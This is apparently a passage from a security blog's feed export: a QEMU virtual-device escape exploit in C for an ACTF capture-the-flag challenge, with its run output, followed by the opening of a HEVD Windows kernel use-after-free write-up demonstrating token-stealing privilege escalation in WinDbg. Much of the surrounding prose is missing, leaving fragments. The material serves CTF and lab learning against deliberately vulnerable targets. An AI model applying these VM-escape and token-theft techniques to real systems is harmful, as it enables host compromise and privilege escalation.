C</code>Csystem</li></ul><p>ABfake_io_addr</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-format off</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="comment">// clang-format on</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_GREEN <span class="string">&quot;\033[32m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_RED <span class="string">&quot;\033[31m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_DEFAULT <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DMSG(fmt, ...)                                                         \</span></span><br><span class="line"><span class="meta">  dprintf(STDERR_FILENO, <span class="string">&quot;[*] %s\t&quot;</span> fmt <span class="string">&quot;\n&quot;</span>, __FILE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMSG(fmt, ...)                                                         \</span></span><br><span class="line"><span class="meta">  dprintf(STDERR_FILENO, COLOR_GREEN <span class="string">&quot;[+] %s\t&quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT,        \</span></span><br><span class="line"><span class="meta">          __FILE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EMSG(fmt, ...)                                                         \</span></span><br><span class="line"><span class="meta">  dprintf(STDERR_FILENO, COLOR_RED <span class="string">&quot;[-] %s\t&quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT,          \</span></span><br><span class="line"><span class="meta">          __FILE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fatal(fmt, ...)                                                        \</span></span><br><span class="line"><span class="meta">  do &#123;                                                                         \</span></span><br><span class="line"><span class="meta">    EMSG(fmt, ##__VA_ARGS__);                                                  \</span></span><br><span class="line"><span class="meta">    exit(EXIT_FAILURE);                                                        \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *mmio_mem;</span><br><span class="line"><span class="type">uint32_t</span> pmio_base = <span class="number">0xC040</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> buf[] =</span><br><span class="line">    <span class="string">&quot;ACTF&#123;cH3cK_1n_wI7h_B@by_C1ph3r_Te$t_1n_Q3MU_pl4yg3OuNd_1$_EASy!&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">pmio_readb</span><span class="params">(<span class="type">uint32_t</span> addr)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">inb</span>(pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">pmio_readl</span><span class="params">(<span class="type">uint32_t</span> addr)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">inl</span>(pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint64_t</span> <span class="title">pmio_readll</span><span class="params">(<span class="type">uint32_t</span> addr)</span> </span>&#123;</span><br><span class="line">  <span class="type">uint64_t</span> low, high;</span><br><span class="line">  high = <span class="built_in">pmio_readl</span>(addr + <span class="number">4</span>);</span><br><span class="line">  low = <span class="built_in">pmio_readl</span>(addr);</span><br><span class="line">  <span class="keyword">return</span> (high &lt;&lt; <span class="number">32</span>) | (low &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title">pmio_writel</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> value)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">outl</span>(value, pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title">pmio_writeb</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint8_t</span> value)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">outb</span>(value, pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span> </span>&#123; <span class="keyword">return</span> *((<span class="type">uint32_t</span> *)(mmio_mem + addr)); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title">mmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> value)</span> </span>&#123;</span><br><span class="line">  *(<span class="type">uint32_t</span> *)(mmio_mem + addr) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title">arb_write</span><span class="params">(<span class="type">uint64_t</span> where, <span class="type">uint64_t</span> what)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">mmio_write</span>(<span class="number">0x40</span>, where &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">  <span class="built_in">pmio_writel</span>(<span class="number">0x10</span>, what &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">  <span class="built_in">pmio_writel</span>(<span class="number">0x14</span>, (what &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup_mmio</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> fd =</span><br><span class="line">      <span class="built_in">open</span>(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">fatal</span>(<span class="string">&quot;Error setup mmio&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  mmio_mem = <span class="built_in">mmap</span>(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">    <span class="built_in">fatal</span>(<span class="string">&quot;Error mmap mmio_fd&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;init mmio&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup_pmio</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">iopl</span>(<span class="number">3</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">fatal</span>(<span class="string">&quot;Error setup pmio: I/O permission is not enough&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;init pmio&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">uint64_t</span> ret;</span><br><span class="line">  <span class="type">uint64_t</span> high, low;</span><br><span class="line">  <span class="type">uint64_t</span> leak_main_arena;</span><br><span class="line">  <span class="type">uint64_t</span> libc_base;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Prepare mmio and pmio ...&quot;</span>);</span><br><span class="line">  <span class="built_in">setup_pmio</span>();</span><br><span class="line">  <span class="built_in">setup_mmio</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Write state-&gt;buffer...&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(buf); i += <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="built_in">mmio_write</span>(i, *(<span class="type">uint32_t</span> *)(buf + i));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Write to set 0xA31 to 1...&quot;</span>);</span><br><span class="line">  <span class="built_in">pmio_writeb</span>(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  ret = <span class="built_in">pmio_readb</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;0xA31 : %#lx&quot;</span>, ret);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Malloc...&quot;</span>);</span><br><span class="line">  <span class="built_in">pmio_writel</span>(<span class="number">0x10</span>, <span class="number">0xdeadbeef</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;Leak libc...&quot;</span>);</span><br><span class="line">  low = <span class="built_in">mmio_read</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">mmio_write</span>(<span class="number">0x40</span>, (low &amp; <span class="number">0xff000000</span>) + <span class="number">0x8a0</span>);</span><br><span class="line">  leak_main_arena = <span class="built_in">pmio_readll</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">mmio_write</span>(<span class="number">0x40</span>, leak_main_arena + <span class="number">0x870</span>);</span><br><span class="line">  libc_base = <span class="built_in">pmio_readll</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;leak main_arena : %#lx&quot;</span>, leak_main_arena + <span class="number">0x870</span>);</span><br><span class="line">  libc_base -= <span class="number">0x1913c80</span>;</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;libc base : %#lx&quot;</span>, libc_base);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span> system_fptr = libc_base + <span class="number">0x1749d70</span>;</span><br><span class="line">  <span class="type">uint64_t</span> IO_wfile_jumps = <span class="number">0x19100c0</span> + libc_base;</span><br><span class="line">  <span class="type">uint64_t</span> IO_list_all = <span class="number">0x1914680</span> + libc_base;</span><br><span class="line">  <span class="type">uint64_t</span> fake_io_addr = leak_main_arena + <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">IMSG</span>(<span class="string">&quot;House of apple V2 ...&quot;</span>);</span><br><span class="line">  <span class="type">char</span> cmd[<span class="number">0x18</span>] = <span class="string">&quot;  cat flag 1&gt;&amp;2&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x18</span>; i += <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="built_in">arb_write</span>(fake_io_addr + i, *(<span class="type">uint64_t</span> *)(cmd + i));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">arb_write</span>(fake_io_addr + <span class="number">0x18</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">arb_write</span>(fake_io_addr + <span class="number">0x28</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">arb_write</span>(fake_io_addr + <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">arb_write</span>(fake_io_addr + <span class="number">0x68</span>, system_fptr);</span><br><span class="line">  <span class="built_in">arb_write</span>(fake_io_addr + <span class="number">0xa0</span>, fake_io_addr);</span><br><span class="line">  <span class="built_in">arb_write</span>(fake_io_addr + <span class="number">0xd8</span>, IO_wfile_jumps);</span><br><span class="line">  <span class="built_in">arb_write</span>(fake_io_addr + <span class="number">0xe0</span>, fake_io_addr);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">arb_write</span>(IO_list_all, fake_io_addr);</span><br><span class="line">  <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">~ <span class="comment"># ./exp</span></span><br><span class="line">[+] exp.c       Prepare mmio and pmio ...</span><br><span class="line">[*] exp.c       init pmio</span><br><span class="line">[*] exp.c       init mmio</span><br><span class="line">[+] exp.c       Write state-&gt;buffer...</span><br><span class="line">[+] exp.c       Write to <span class="built_in">set</span> 0xA31 to 1...</span><br><span class="line">[*] exp.c       0xA31 : 0</span><br><span class="line">[+] exp.c       Malloc...</span><br><span class="line">[+] exp.c       Leak libc...</span><br><span class="line">[*] exp.c       leak main_arena : 0x7f0f680008a0</span><br><span class="line">[*] exp.c       libc base : 0x7f0f6d4e9000</span><br><span class="line">[+] exp.c       House of apple V2 ...</span><br><span class="line">[    4.651800] exp (53) used greatest stack depth: 14000 bytes left</span><br><span class="line">~ <span class="comment"># exit</span></span><br><span class="line">[    6.480651] ACPI: PM: Preparing to enter system <span class="built_in">sleep</span> state S5</span><br><span class="line">[    6.481266] reboot: Power down</span><br><span class="line">ACTF&#123;7ry_b4by_q3mu_ch@1leng3_4nd_g3t_b@by_f1ag&#125;</span><br></pre></td></tr></table></figure><p> todoORWshellcode</p><h2 id="MORE"><a href="#MORE" class="headerlink" title="MORE"></a>MORE</h2><ol><li>qemulibc</li><li> State  MemroyRegion  ops</li><li></li></ol><p>Qemu8.xRWX<a href="https://eqqie.cn/index.php/archives/2077">[bi0sCTF 2024]: virto-note</a></p><h3 id="Qemu-minitor"><a href="#Qemu-minitor" class="headerlink" title="Qemu minitor"></a>Qemu minitor</h3><p> <code>ctrl + a =&gt; c</code> minitormonitor<strong></strong><strong></strong><strong></strong><strong></strong></p><h3 id="Qemu-KVM"><a href="#Qemu-KVM" class="headerlink" title="Qemu KVM"></a>Qemu KVM</h3><p>KVMKernal-based Virtual Machine LinuxWindows</p><p>KVMQEMUQEMU</p><h3 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h3><p>todo</p><ul><li>ACTF2023 EasyVirtio CVE-2023-3180</li><li>CVE-2019-6778</li></ul><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ul><li><a href="http://www.phrack.org/issues/70/5.html">VM escape - QEMU Case Study</a></li><li><a href="https://xtxtn.github.io/2023/11/02/ACTF2023/">ACTF2023 EasyVirtio</a></li><li><a href="https://richardweiyang-2.gitbook.io/understanding_qemu/00-devices/01-type_register">understanding_qemu</a></li><li><a href="https://eqqie.cn/index.php/archives/1834">https://eqqie.cn/index.php/archives/1834</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Qemu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HEVD-UAF</title>
      <link href="/2024/02/07/HEVD-UAF/"/>
      <url>/2024/02/07/HEVD-UAF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Windows Kernel NonPagedPool UAF</p></blockquote><span id="more"></span><p>win10 22h2</p><p><a href="https://github.com/Ha0-Y/HEVDExploits">HEVDExploits</a></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><code>Builder/Build_HEVD_Vulnerable_x64.bat</code></p><p>VS</p><ul><li>-&gt;DriverSetting win7&#x2F;win10x64</li></ul><h2 id="Windows-API"><a href="#Windows-API" class="headerlink" title="Windows API"></a>Windows API</h2><p><code>#pragma alloc_text(PAGE, UseUaFObjectNonPagedPool)</code>Windows</p><ul><li><code>#pragma alloc_text</code></li><li><code>PAGE</code><code>#pragma alloc_text</code><code>PAGE</code></li></ul><p>ExAllocatePoolWithTag: </p><ul><li><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ne-wdm-_pool_type">POOL_TYPE (wdm.h)</a></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">ExAllocatePoolWithTag</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] __drv_strictTypeMatch(__drv_typeExpr)POOL_TYPE PoolType,         <span class="comment">// POOL_TYPE </span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] SIZE_T                                         NumberOfBytes,    <span class="comment">// </span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] ULONG                                          Tag               <span class="comment">// </span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>; </span><br></pre></td></tr></table></figure><p>windows  Windows , </p><ul><li> </li><li></li><li><strong>PagedPool</strong><strong>NonPagedPool</strong></li></ul><p>ExFreePoolWithTag: </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">ExFreePoolWithTag</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PVOID P,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] ULONG Tag</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>NtAllocateReserveObjectntdllHandle</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS STDCALL <span class="title">NtAllocateReserveObject</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    OUT PHANDLE hObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN POBJECT_ATTRIBUTES ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN DWORD ObjectType </span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>tokentoken</p><p>Windows<code>nt authority\system</code></p><ul><li>SYSTEMtokensystem<a href="https://bbs.kanxue.com/thread-224058-1.htm">(1)</a></li><li>ACL&#x2F;ACE  token<code>dt _token : +0x040 Privileges: _SEP_TOKEN_PRIVILEGES</code><a href="https://wonderkun.cc/2021/08/22/windows10%E5%86%85%E6%A0%B8%E6%80%81%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB/">(2)</a></li></ul><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>System16</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; !dml_proc</span><br><span class="line">Address           PID  Image file name</span><br><span class="line">ffff940f`cfea7080 4    System</span><br><span class="line">...</span><br><span class="line">ffff940f`d7240080 2270 cmd.exe</span><br><span class="line"></span><br><span class="line">0: kd&gt; !process 0 0 system</span><br><span class="line">PROCESS ffff940fcfea7080</span><br><span class="line">    SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000</span><br><span class="line">    DirBase: 001ad000  ObjectTable: ffffe78dfac04800  HandleCount: 3023.</span><br><span class="line">    Image: System</span><br></pre></td></tr></table></figure><p><code>_EPROCESS</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dt _EPROCESS ffff940f`cfea7080</span><br><span class="line">ntdll!_EPROCESS</span><br><span class="line">   +0x000 Pcb              : _KPROCESS</span><br><span class="line">   +0x438 ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +0x440 UniqueProcessId  : 0x00000000`00000004 Void</span><br><span class="line">   +0x448 ActiveProcessLinks : _LIST_ENTRY [ 0xffff940f`cff084c8 - 0xfffff803`7181e130 ]</span><br><span class="line">   +0x458 RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">   ...</span><br><span class="line">   +0x4b8 Token            : _EX_FAST_REF</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure><p>tokentoken<code>_EX_FAST_REF</code><code>_TOKEN</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dq ffffe78dfac04800+4b8 L1</span><br><span class="line">ffffe78d`fac04cb8  ffffe78d`fac0c05e</span><br><span class="line"></span><br><span class="line">0: kd&gt; dt _EX_FAST_REF ffffe78dfac04800+4b8</span><br><span class="line">ntdll!_EX_FAST_REF</span><br><span class="line">   +0x000 Object           : 0xffffe78d`fac0c05e Void</span><br><span class="line">   +0x000 RefCnt           : 0y1110</span><br><span class="line">   +0x000 Value            : 0xffffe78d`fac0c05e</span><br></pre></td></tr></table></figure><p> <code>token</code> 0token</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; !token ffffe78d`fac0c050</span><br></pre></td></tr></table></figure><p>cmd.exe<code>_EPROCESS</code>0x208tokenSystemtoken</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; !process 0 0 cmd.exe</span><br><span class="line">PROCESS ffff940fd7240080</span><br><span class="line">    SessionId: 1  Cid: 2270    Peb: f4e7043000  ParentCid: 13bc</span><br><span class="line">    DirBase: 172720000  ObjectTable: ffffe78e02a18080  HandleCount:  75.</span><br><span class="line">    Image: cmd.exe</span><br><span class="line"></span><br><span class="line">0: kd&gt; dt _EX_FAST_REF +0x4b8+ffff940fd7240080</span><br><span class="line">ntdll!_EX_FAST_REF</span><br><span class="line">   +0x000 Object           : 0xffffe78e`02dcb06b Void</span><br><span class="line">   +0x000 RefCnt           : 0y1011</span><br><span class="line">   +0x000 Value            : 0xffffe78e`02dcb06b</span><br><span class="line"></span><br><span class="line">0: kd&gt; eq 0x4b8+ffff940fd7240080 0xffffe78d`fac0c050</span><br><span class="line">0: kd&gt; dt _EX_FAST_REF +0x4b8+ffff940fd7240080</span><br><span class="line">ntdll!_EX_FAST_REF</span><br><span class="line">   +0x000 Object           : 0xffffe78d`fac0c05e Void</span><br><span class="line">   +0x000 RefCnt           : 0y1110</span><br><span class="line">   +0x000 Value            : 0xffffe78d`fac0c05e</span><br><span class="line">0: kd&gt; g</span><br></pre></td></tr></table></figure><p></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">debugger</span>&gt;<span class="title">whoami</span></span></span><br><span class="line"><span class="function"><span class="title">desktop</span>-8<span class="title">h64pu1</span>\<span class="title">debugger</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># <span class="title">WinDbg</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">debugger</span>&gt;<span class="title">whoami</span></span></span><br><span class="line"><span class="function"><span class="title">nt</span> <span class="title">authority</span>\<span class="title">system</span></span></span><br></pre></td></tr></table></figure><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p> <code>_KTHREAD</code>  <code>PsGetCurrentThread</code> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; uf PsGetCurrentProcess </span><br><span class="line">nt!PsGetCurrentProcess:</span><br><span class="line">fffff801`3f68eea0 65488b042588010000 mov   rax,qword ptr gs:[188h]</span><br><span class="line">fffff801`3f68eea9 488b80b8000000  mov     rax,qword ptr [rax+0B8h]</span><br><span class="line">fffff801`3f68eeb0 c3              